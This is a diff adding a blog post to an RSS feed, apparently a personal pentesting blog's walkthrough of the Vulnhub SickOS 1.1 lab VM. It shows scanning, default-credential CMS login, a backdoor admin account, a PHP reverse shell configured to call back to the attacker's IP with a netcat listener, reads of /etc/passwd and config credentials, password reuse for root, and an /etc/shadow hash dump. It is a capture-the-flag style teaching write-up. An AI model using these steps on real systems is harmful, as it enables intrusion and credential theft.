@@ -5,9 +5,392 @@
     <description>A small website blog for cyber sec and pentesting adventures. </description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Wed, 01 Feb 2017 10:16:29 +0000</pubDate>
-    <lastBuildDate>Wed, 01 Feb 2017 10:16:29 +0000</lastBuildDate>
+    <pubDate>Thu, 16 Feb 2017 10:16:05 +0000</pubDate>
+    <lastBuildDate>Thu, 16 Feb 2017 10:16:05 +0000</lastBuildDate>
     <generator>Jekyll v3.3.1</generator>
+    
+      <item>
+        <title>Vulnhub Sick OS 1.1</title>
+        <description>&lt;p&gt;If you want to follow along you can grab the Sick OS 1.1 VM from here &lt;a href=&quot;https://www.vulnhub.com/entry/sickos-11,132/&quot;&gt;SickOS&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;Vulnhub - Sick OS 1.1 VM
+
+Name........: SickOs1.1
+Date Release: 11 Dec 2015
+Author......: D4rk
+Series......: SickOs
+Objective...: Get /root/a0216ea4d51874464078c618298b1367.txt
+Tester(s)...: h1tch1
+Twitter.....: https:twitter.com/D4rk36/
+
+Type: Boot-to-Root VM
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Host discovery&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Ok first things first, we need to identify the host in my lab (the lab is sandboxed and IP ranges changed regularly). I used netdiscover for that:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;# netdiscover -r 192.168.1.0/24
+
+Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                                
+
+ 20 Captured ARP Req/Rep packets, from 7 hosts.   Total size: 1200                                                                                                                                                            
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.1.94    08:00:27:ac:f3:c3      1      60  Cadmus Computer Systems                                                                                                                                                                                                                                 
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ok good so now we have our target IP: 192.168.1.94&lt;/p&gt;
+
+&lt;p&gt;Port scan and service enumeration&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;:~# nmap -Pn -p- -sSV -A 192.168.1.94
+
+Starting Nmap 7.31 ( https://nmap.org ) at 2016-11-24 11:19 EST
+Nmap scan report for SickOs.home (192.168.1.94)
+Host is up (0.00084s latency).
+Not shown: 65532 filtered ports
+PORT     STATE  SERVICE    VERSION
+22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
+|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
+|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
+3128/tcp open   http-proxy Squid http proxy 3.1.19
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:GET
+|_http-server-header: squid/3.1.19
+|_http-title: ERROR: The requested URL could not be retrieved
+8080/tcp closed http-proxy
+MAC Address: 08:00:27:AC:F3:C3 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.4
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.84 ms SickOs.home (192.168.1.94)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 120.07 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So, our Nmap scan has identified that TCP Port 22 SSH and Port 3128 Squid proxy are open. Now we have starting point!&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Squid proxy&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Starting with the Squid proxy http service, I accessed it via a web browser and got this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/SickOS/Browser-error.png&quot; alt=&quot;Browser&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I also grabbed the HTTP Headers (just in case!):&lt;/p&gt;
+
+&lt;p&gt;HTTP Header info:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-nohiglight&quot;&gt;:~# curl -LIN 192.168.1.94:3128
+HTTP/1.0 400 Bad Request
+Server: squid/3.1.19
+Mime-Version: 1.0
+Date: Thu, 24 Nov 2016 17:04:44 GMT
+Content-Type: text/html
+Content-Length: 3150
+X-Squid-Error: ERR_INVALID_URL 0
+Vary: Accept-Language
+Content-Language: en
+X-Cache: MISS from localhost
+X-Cache-Lookup: NONE from localhost:3128
+Via: 1.0 localhost (squid/3.1.19)
+Connection: close
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This didn’t give us much, as expected! Now lets set up our browser to use the Squid proxy:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/SickOS/ConnectionSetting.png&quot; alt=&quot;Proxy Setup&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we have the proxy in place, it’s probably a good time to run Nikto and or Dirb (I ran both):&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Nikto&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Now, I’d not used nikto to scan using a proxy before, so this was new to me! A quick google/man page read sorted out the finer details.&lt;/p&gt;
+
+&lt;p&gt;I needed to make a change to the ‘/etc/nikto.conf’ file and add these lines:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;# Proxy settings -- still must be enabled by -userproxy
+PROXYHOST=192.168.1.94
+PROXYPORT=3128
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Once the changes had been made and saved, it was time to set Nikto loose!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/SickOS/Nikto.png&quot; alt=&quot;Nikto&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Dirb&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Using Dirb via the proxy was a similar process, though no config change was needed,  I just had to specify the target URL, add the ‘-p’ flag, then our target IP:Port.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/SickOS/Dirb.png&quot; alt=&quot;Dirb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ok, so know we have a decent idea of what’s going on with the web-server. Now that the proxy is enabled, I opened up a browser again and entered the target IP:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/SickOS/Blehhh.png&quot; alt=&quot;Dirb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we have a different response, winner! Now we’re gaining some traction!!!
+So lets check the ‘/robots.txt’ file highlighted by Dirb.&lt;/p&gt;
+
+&lt;p&gt;So the /robots.txt file reveals:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;User-agent: *
+Disallow: /
+Dissalow: /wolfcms
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Another clue … ‘/wolfcms’, the game is a foot, lets get investigating!!!&lt;/p&gt;
+
+&lt;p&gt;By browsing to ‘192.168.1.94/wolfcms/’ we are greeted with a WolfCMS page (a quick google confirmed this was a content management system):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/SickOS/Wolfcms.png&quot; alt=&quot;WolfCMS&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So, there wasn’t an obvious login option on the WolfCMS page, time for our old faithful friend, Google! A quick google lead me to this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;&amp;lt;Target_URL&amp;gt;/wolfcms/?/admin/login
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/SickOS/Wolfcms-login.png&quot; alt=&quot;Wolf Login&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As soon as I clicked on the ‘Username’ field an auto complete box popped up with the following:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/SickOS/Wolfcms-login-password.png&quot; alt=&quot;Wolf password&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Taking this as a sign from the ‘L33T’ gods, I entered the old faithful combo of ‘admin/admin’; however, this failed with the following error:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;The page isn't redirecting properly
+
+Firefox has detected that the server is redirecting the request for this address in a way that will never complete.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Hmmm … what’s going on here then!&lt;/p&gt;
+
+&lt;p&gt;After a little online search, it seems that this may have something to do with cookies. A quick search led me to this…&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;On the redirect page press 'Alt + t' &amp;gt; Page info &amp;gt;  Security &amp;gt; View Coookies &amp;gt; Search &amp;lt;Target_IP&amp;gt; &amp;gt; 'Remove All' and close.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Once I had done the above, I refreshed the browser. This took me back to the login screen. I Re-entered the ‘admin/admin’ combo and I was in! If you’re following along, you should be greeted with the following:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/SickOS/Wolfcms-Admin.png&quot; alt=&quot;Wolf Admin&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So now we have access to the web server as an administrator. Looking around the settings confirms this, and it also seems I have the option to add a user and upload files!! DING DING DING!!! So I added an additional user as a back up with the same privilege level as the Administrator user:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;Name: bob
+Username: Hacker
+Password: Hacker123
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;em&gt;NB: Cheese alert!! I was having a ‘L33t’ moment with the username/password combo … forgive me!&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Ok, so a quick recap; we now have web access as the administrator to the target hosts CMS application and we have added a back up user for those ‘just incase’ scenarios. Though this is not the main objective, we need to root the host!&lt;/p&gt;
+
+&lt;p&gt;After this I switched my attention to the file upload facility that I have access to as the user ‘administrator’!&lt;/p&gt;
+
+&lt;p&gt;The web server runs php code with at least one php file present already (as seen below):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;%B%Y archive
+&amp;lt;?php $archives = $this-&amp;gt;archive-&amp;gt;get(); ?&amp;gt;
+&amp;lt;?php foreach ($archives as $archive): ?&amp;gt;
+&amp;lt;div class=&quot;entry&quot;&amp;gt;
+  &amp;lt;h3&amp;gt;&amp;lt;?php echo $archive-&amp;gt;link(); ?&amp;gt;&amp;lt;/h3&amp;gt;
+  &amp;lt;p class=&quot;info&quot;&amp;gt;Posted by &amp;lt;?php echo $archive-&amp;gt;author(); ?&amp;gt; on &amp;lt;?php echo $archive-&amp;gt;date(); ?&amp;gt;
+  &amp;lt;/p&amp;gt;
+&amp;lt;/div&amp;gt;
+&amp;lt;?php endforeach; ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;With this in mind, now seems like a good time to thinking about upload a PHP-Reverse-Shell! Pentestmonkey springs to mind! A quick visit to his site &lt;a href=&quot;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;Pentestmonkey.net&lt;/a&gt; lets us nab a copy of his:&lt;/p&gt;
+
+&lt;p&gt;I modified the code to suit our scenario.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;set_time_limit (0);
+$VERSION = &quot;1.0&quot;;
+$ip = '192.168.1.174';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+$chunk_size = 1400;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;As I now know from the Nikto/Dirb scans there are publicly accessible/browsable directories available on the host via the web browser. One of these dir’s is ‘/public/images’. This seems like a good location to upload our shell to. Through our Administrator console&lt;/p&gt;
+
+&lt;p&gt;Selecting the ‘Files’ option:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/SickOS/Wolfcms-fileupload.png&quot; alt=&quot;Wolf Admin&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Uploading the php-reverse-shell file to the ‘/public/images’ directory is successful.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Exploit time…&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Starting a netcat listener on my host allows me to catch the incoming connection from our reverse shell that I uploaded:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;nc -lvp 1234
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then by browsing to the reverse shell URL:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;http://192.168.1.94/wolfcms/public/images/
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We trigger our reverse php shell by double clicking on it. This will then activate on our attacking host terminal where we set up the netcat listener:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;root@Shadow:~# nc -l -v -p 1234
+listening on [any] 1234 ...
+connect to [192.168.1.174] from SickOs.home [192.168.1.94] 41618
+Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
+ 15:29:06 up 31 min,  0 users,  load average: 0.01, 0.05, 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ whoami
+www-data
+$ ls
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ok, so its a low privilege shell! We need to elevate!! Whilst here, I look around for anything that can help with that:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;Host info (/etc/os-release):
+
+$ cat os-release
+NAME=&quot;Ubuntu&quot;
+VERSION=&quot;12.04.4 LTS, Precise Pangolin&quot;
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME=&quot;Ubuntu precise (12.04.4 LTS)&quot;
+VERSION_ID=&quot;12.04&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then I had a look at the ‘/etc/passwd’ file for other users:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;$ cat passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+messagebus:x:102:105::/var/run/dbus:/bin/false
+whoopsie:x:103:106::/nonexistent:/bin/false
+landscape:x:104:109::/var/lib/landscape:/bin/false
+sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
+mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;em&gt;Note the ‘sickos’ user highlighted above.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;I then decided to look in the ‘/var/www’ dir, to see if any of the files there have anything useful:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;$ cd ../var/www                       
+$ ls
+connect.py
+index.php
+robots.txt
+wolfcms
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;‘wolfcms’ is directory, so I looked in there to:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;$ cd wolfcms
+$ ls
+CONTRIBUTING.md
+README.md
+composer.json
+config.php
+docs
+favicon.ico
+index.php
+public
+robots.txt
+wolf
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;While having a look through the files in this dir the ‘config.php’ seemed like an obvious place to start for any hardcoded creds. Bingo!! The file contained some interesting details:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;// Database settings:
+define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
+define('DB_USER', 'root');
+define('DB_PASS', 'john@123');
+define('TABLE_PREFIX', '');
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;With the above info and using the discovered user ‘sickos’ I can now attempt to leverage the ssh service on the target host:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/SickOS/ssh.png&quot; alt=&quot;Wolf Admin&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;With the user confirmed as ‘sickos’ I checked if I had sudo privileges, using the same password ‘john@123’. This was accepted and I now have root privilege:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;sickos@SickOs:/$ sudo su
+[sudo] password for sickos:
+root@SickOs:/# whoami
+root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;With this now confirmed, time to get some info:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;--[Snip of shadow file]--
+root@SickOs:/# cat /etc/shadow
+root:$6$0QtWAOH/$6uGGYVCw2lccBlovXeH8dqH6ILcCRZw.OydoldEZVS3m7RxgdUoZLl3UbDId59KMTUuxkGG/ln0gbwWSO7kNp.:16775:0:99999:7:::
+sickos:$6$x3xnQBfR$4WohiqaIzmpfk1duLLeJqA33zNhEQeuvPS4NiLLIxxOyNwz2dRMUbah.MZ0gSVMV4YNJC6meNpxa4YSrSJ75X.:16700:0:99999:7:::
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;User hashes dumped.&lt;/p&gt;
+
+&lt;p&gt;And saving the best for last ………&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/SickOS/Proof.png&quot; alt=&quot;Wolf Admin&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There we have it folks! We got through it all and completed the objective, root access and ultimately pwnd SickOS! This is just the way I ‘rooted’ SickOS, there are other ways of doing this and more info can be retrieved…&lt;/p&gt;
+
+&lt;p&gt;I’d like to say a big thank you to &lt;a href=&quot;https://twitter.com/VulnHub&quot;&gt;@Vulnhub&lt;/a&gt; and &lt;a href=&quot;https:twitter.com/D4rk36/&quot;&gt;@D4rk36&lt;/a&gt; for providing the Sick OS series.&lt;/p&gt;
+
+&lt;p&gt;Well thats it folks… You don’t have to go home, but you cant stay here!&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading!!&lt;/p&gt;
+</description>
+        <pubDate>Thu, 16 Feb 2017 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000/vulnhub/2017/02/16/Sick-OS/</link>
+        <guid isPermaLink="true">http://localhost:4000/vulnhub/2017/02/16/Sick-OS/</guid>
+        
+        <category>2017</category>
+        
+        <category>Vulnhub</category>
+        
+        <category>walkthroughs</category>
+        
+        <category>Sick OS</category>
+        
+        <category>New</category>
+        
+        
+        <category>Vulnhub</category>
+        
+      </item>
     
       <item>
         <title>Vulnhub Series</title>
